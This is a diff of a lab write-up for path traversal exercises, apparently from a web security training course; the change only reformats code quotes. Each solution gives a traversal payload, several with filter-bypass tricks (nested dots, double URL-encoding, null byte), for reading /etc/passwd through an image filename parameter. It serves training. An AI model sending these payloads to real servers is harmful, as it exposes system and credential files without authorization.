@@ -6,7 +6,7 @@
 **Solution:**
 1. Click on any image and observe the parameter. When a user clicks on any image, the parameter looks like "filename=31.jpg".
 2. Now, attempt to access the "/etc/passwd" file by modifying the parameter to "../../etc/passwd".
-3. `<URL>?filename=../../etc/passwd`
+3. ```<URL>?filename=../../etc/passwd```
         Congratulations, you solved the lab!
 
 ## PRACTITIONER
@@ -17,7 +17,7 @@
 **Solution:**
 1. Click on any image and observe the parameter. When a user clicks on any image, the parameter looks like "filename=22.jpg".
 2. Now, attempt to access the "/etc/passwd" file by modifying the parameter to "/etc/passwd".
-3. `<URL>?filename=/etc/passwd`
+3. ```<URL>?filename=/etc/passwd```
         Congratulations, you solved the lab!
 
 ## PRACTITIONER
@@ -28,7 +28,7 @@
 **Solution:**
 1. Click on any image and observe the parameter. When a user clicks on any image, the parameter looks like "filename=22.jpg".
 2. Now, attempt to access the "/etc/passwd" file by modifying the parameter to "....//....//....//etc/passwd".
-3. `<URL>?filename=....//....//....//etc/passwd`
+3. ```<URL>?filename=....//....//....//etc/passwd```
         Congratulations, you solved the lab!
 
 ## PRACTITIONER
@@ -39,7 +39,7 @@
 **Solution:**
 1. Click on any image and observe the parameter. When a user clicks on any image, the parameter looks like "filename=22.jpg".
 2. Now, attempt to access the "/etc/passwd" file by modifying the parameter to "..%252f..%252f..%252fetc%252fpasswd".
-3. `?filename=..%252f..%252f..%252fetc%252fpasswd`
+3. ```?filename=..%252f..%252f..%252fetc%252fpasswd```
         Congratulations, you solved the lab!
 
 ## PRACTITIONER
@@ -50,7 +50,7 @@
 **Solution:**
 1. Click on any image and observe the parameter. When a user clicks on any image, the parameter looks like "filename=22.jpg".
 2. Now, attempt to access the "/etc/passwd" file by modifying the parameter to "/var/www/images/../../../etc/passwd".
-3. `?filename=/var/www/images/../../../etc/passwd`
+3. ```?filename=/var/www/images/../../../etc/passwd```
         Congratulations, you solved the lab!
 
 ## PRACTITIONER
@@ -61,7 +61,7 @@
 **Solution:**
 1. Click on any image and observe the parameter. When a user clicks on any image, the parameter looks like "filename=22.jpg".
 2. Now, attempt to access the "/etc/passwd" file by modifying the parameter to "../../../etc/passwd%00.jpg".
-3. `?filename=../../../etc/passwd%00.jpg`
+3. ```?filename=../../../etc/passwd%00.jpg```
         Congratulations, you solved the lab!
 
 
